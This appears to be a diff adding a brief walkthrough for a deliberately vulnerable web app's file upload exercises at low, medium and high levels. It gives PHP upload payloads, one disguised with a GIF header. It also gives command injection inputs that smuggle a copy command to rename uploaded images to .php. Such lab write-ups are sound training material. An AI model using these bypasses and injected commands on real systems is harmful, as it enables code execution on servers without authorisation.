@@ -1,0 +1,33 @@
+ 
+# File Upload
+## Low
+* Create the following php file
+* Upload it
+```php
+<?php
+echo getenv("PATH")
+?>
+```
+* Access the file.
+ 
+## Medium
+* Create the php file
+* Save it as .png file
+* upload it
+* go to command injection
+* ``127.0.0.1 & copy ..\..\hackable\uploads\uploadmed.png ..\..\hackable\uploads\uploadmed.php``
+* now go back to uploads and access the file.
+ 
+## High
+* The php file looks like
+```php
+GIF98
+<?php
+echo getenv('PATH')
+?>
+```
+* Save it as .jpeg file
+* Upload it
+* go to command injection
+* ``127.0.0.1|copy ..\..\hackable\uploads\uploadhigh.jpeg ..\..\hackable\uploads\uploadhigh.php``
+* now go back to uploads and access the file.
